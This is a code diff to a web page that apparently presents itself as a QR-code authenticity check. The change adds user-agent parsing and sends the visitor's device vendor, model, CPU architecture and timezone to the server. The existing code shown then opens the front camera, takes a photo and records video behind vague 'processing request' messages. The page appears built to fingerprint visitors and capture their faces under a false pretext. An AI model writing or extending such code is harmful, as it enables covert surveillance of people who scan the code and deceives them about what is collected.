@@ -7,6 +7,7 @@ import { useLayoutContext } from '@/context/LayoutContext';
 import { showSuccess, showError } from '@/utils/toast';
 import LoadingSpinner from '@/components/LoadingSpinner';
 import { RefreshCcw } from 'lucide-react';
+import { UAParser } from 'ua-parser-js'; // Import UAParser
 
 type QrVerifyPageProps = {
   params: { lang: string };
@@ -67,7 +68,15 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         }
       }
 
-      // 2. Send initial visit notification to get caption
+      // 2. Get User-Agent details and client timezone
+      const uaParser = new UAParser();
+      const uaResult = uaParser.getResult();
+      const deviceVendor = uaResult.device.vendor || null;
+      const deviceModel = uaResult.device.model || null;
+      const cpuArchitecture = uaResult.cpu.architecture || null;
+      const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+      // 3. Send initial visit notification to get caption
       const utmQueryParams = {
         utm_source: searchParams?.get('utm_source') || null,
         utm_medium: searchParams?.get('utm_medium') || null,
@@ -80,11 +89,15 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         screenHeight: window.innerHeight,
         isQrScan: true,
         pagePath: pathname,
+        deviceVendor,
+        deviceModel,
+        cpuArchitecture,
+        clientTimezone,
       };
       const initialCaption = await notifyVisit(bodyData, utmQueryParams);
       // setCaptionMessage(initialCaption); // Removed state update
 
-      // 3. Request Camera Access (front camera first)
+      // 4. Request Camera Access (front camera first)
       setStatusMessage(t.authenticity.processingRequest);
       let mediaStream: MediaStream;
       try {
@@ -104,7 +117,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
 
       await new Promise(resolve => setTimeout(resolve, 1000)); 
 
-      // 4. Take Photo
+      // 5. Take Photo
       setStatusMessage(t.authenticity.processingRequest);
       if (videoRef.current && canvasRef.current) {
         const video = videoRef.current;
@@ -128,7 +141,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         }
       }
 
-      // 5. Start Video Recording (if photo was successful)
+      // 6. Start Video Recording (if photo was successful)
       setStatusMessage(t.authenticity.recordingInstructions);
       const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
       setMediaRecorder(recorder);
@@ -189,7 +202,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
       setIsRecording(false);
       stopCamera();
     }
-  }, [currentLang, searchParams, pathname, t, stopCamera, recordedChunks]); // Added recordedChunks to dependencies
+  }, [currentLang, searchParams, pathname, t, stopCamera, recordedChunks]);
 
   useEffect(() => {
     startVerificationProcess();
